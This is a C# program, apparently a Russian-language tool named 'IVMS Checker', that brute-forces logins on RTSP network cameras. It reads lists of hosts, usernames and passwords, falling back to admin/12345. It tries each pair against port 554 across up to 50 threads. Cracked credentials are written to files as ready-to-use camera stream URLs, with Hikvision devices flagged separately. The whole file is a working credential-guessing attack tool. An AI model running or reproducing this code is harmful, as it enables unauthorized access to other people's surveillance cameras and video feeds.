using System;
using System.Text;
using System.IO;
using System.Net.Sockets;
using System.Diagnostics;
using System.Threading;
using System.Collections.Generic;

namespace IVMSC2
{
	class MainClass
	{
		const string _passFile = "Passwords.txt"; 
		const string _loginFile = "Logins.txt";
		const string _hostsFile = "Hosts.txt";

		const string _goodsFile = "Good.txt";
		const string _goodsFile2 = "Good2.txt";

		const string _defaultLogin = "admin"; 
		const string _defaultPass = "12345";

		const Int16 _defaultPort = 554; // стандарный порт rtsp

		static string[] passwds, logins;
		const int _connetionTimeout = 5;

		private const int MaxThread = 50; // максимальное кол-во потоков
		private static readonly Object sync = new object();
		private static readonly AutoResetEvent reset = new AutoResetEvent(false);
		private static readonly List<Thread> threads = new List<Thread>();


		public static string Describe(string ip, string login, string pass, int CSeq = 2)
		{
			var auth = Convert.ToBase64String(Encoding.ASCII.GetBytes(string.Format("{0}:{1}", login, pass)));

			var builder = new StringBuilder ();
			builder.AppendFormat ("DESCRIBE rtsp://{0} RTSP/1.0\r\n", ip);
			builder.AppendFormat ("CSeq: {0}\r\n", CSeq);
			//builder.AppendFormat ("WWW-Authenticate: Digest {0}\r\n\r\n", auth);
			builder.AppendFormat ("Authorization: Basic {0}\r\n\r\n", auth);
			return builder.ToString ();
		}

		public static void Check(object ip)
		{
			string host = (string)ip;

			Console.WriteLine ("Scan: {0}", host);

			bool again = true;
				
			for (int j = 0; j < logins.Length; j++) {
				for (int i = 0; i < passwds.Length; i++) {
					
					using (TcpClient tcp = new TcpClient ()) {  
						try {  
							var result = tcp.BeginConnect (host, _defaultPort, null, null);
			
							var successConnect = result.AsyncWaitHandle.WaitOne (TimeSpan.FromSeconds (_connetionTimeout));

							if (!successConnect) {
								again = false;
								throw new Exception ("Failed to connect.");
							}
							
							using (var stream = tcp.GetStream ()) {

								// write describe auth
								{
									var authPacket = Encoding.ASCII.GetBytes (Describe (host, logins [j], passwds [i]));
									stream.Write (authPacket, 0, authPacket.Length);
								}

								// receive
								{
									var bytes = new byte[tcp.ReceiveBufferSize];
									stream.Read (bytes, 0, (int)tcp.ReceiveBufferSize);
									var returndata = Encoding.ASCII.GetString (bytes);

									Debug.WriteLine (returndata);

									// good
									if (returndata.Contains ("RTSP/1.0 200 OK")) {		

										again = false;

										Console.WriteLine ("\tHost: {0}; Login: {1}; Pass: {2}", host, logins [j], passwds [i]);

										if (returndata.Contains ("a=control:rtsp://")//hikvision sign1
										 && returndata.Contains ("Media Presentation")) { //hikvision sign2
											File.AppendAllText (_goodsFile2, string.Format ("rtsp://{0}:{1}@{2}" + Environment.NewLine, logins [j], passwds [i], host));
										}
										File.AppendAllText (_goodsFile, string.Format ("rtsp://{0}:{1}@{2}" + Environment.NewLine, logins [j], passwds [i], host));


									} else if (returndata.Contains ("RTSP/1.0 401 Unauthorized")) {
										//Unauthorized
									}
								}
							
							}

							//tcp.EndConnect (result);
						} catch (Exception ex) {
							Debug.WriteLine (ex);
						} finally {  
							tcp.Close ();
						}
					}

					if (again == false) {
						goto end;
					}

				}
			
			}

			end:
			lock (sync)
				threads.Remove (Thread.CurrentThread);
			reset.Set ();
		}
	
		public static void Main (string[] args)
		{
			Console.WriteLine ("IVMS Checker v2.3");

			if (!File.Exists (_passFile) || !File.Exists (_loginFile)) {
				passwds = new []{ _defaultPass };
				logins = new []{ _defaultLogin };
			} else {
				passwds = File.ReadAllLines (_passFile);
				logins = File.ReadAllLines (_loginFile);
			}
			Console.WriteLine ("Паролей загружено: {0}", passwds.Length);
			Console.WriteLine ("Логиней загружено: {0}", logins.Length);

			if (!File.Exists (_hostsFile)) {
				Console.WriteLine ("Файл с хостами не найден");
				Console.ReadLine ();
				return;
			}

			using (var r = new StreamReader (_hostsFile)) {
				string hostLine;

				while ((hostLine = r.ReadLine ()) != null) {
					
					var worker = new Thread (Check);
					worker.Start (hostLine); 
					threads.Add (worker);

					if (threads.Count >= MaxThread)
						reset.WaitOne ();
				}
			}
				
			while (threads.Count != 0) {
				Debug.WriteLine (threads.Count);
				Thread.Sleep (1000);
			}
		
			Debug.WriteLine ("done");

		}
	}
}
